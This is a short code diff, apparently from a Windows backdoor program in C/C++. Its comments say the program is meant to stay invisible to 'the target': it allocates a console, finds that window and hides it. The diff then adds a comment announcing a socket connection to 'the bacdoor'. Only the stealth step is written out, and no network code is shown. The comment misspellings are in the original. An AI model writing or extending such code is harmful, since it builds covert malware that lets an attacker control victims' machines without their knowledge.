@@ -28,11 +28,13 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     //Let's Program to make program execution invisible to the target while execution.
     HWND stealth;
     AllocConsole();//Allocate new console to the calling process.
-    //below funtion handle windows top level window it take 2 parameters 1 is Class name 2 is Windows name it should be null.
+    //below funtion handle windows top level functions window it take 2 parameters. 1 is Class name and 2 is Windows name it should be null.
     stealth = FindWindowA("ConsoleWindowClass", NULL);
 
     //Reason - that we we want to show a windows to target or not.
     //It take 2 arguments. 1 one handle windows that we specify earlier.
     // 2nd arg - is 0 - Hiding the current window and activate another window.
     ShowWindow(stealth, 0);
+
+    //Let'Start to create a socket to begin the connection with the bacdoor.
 }
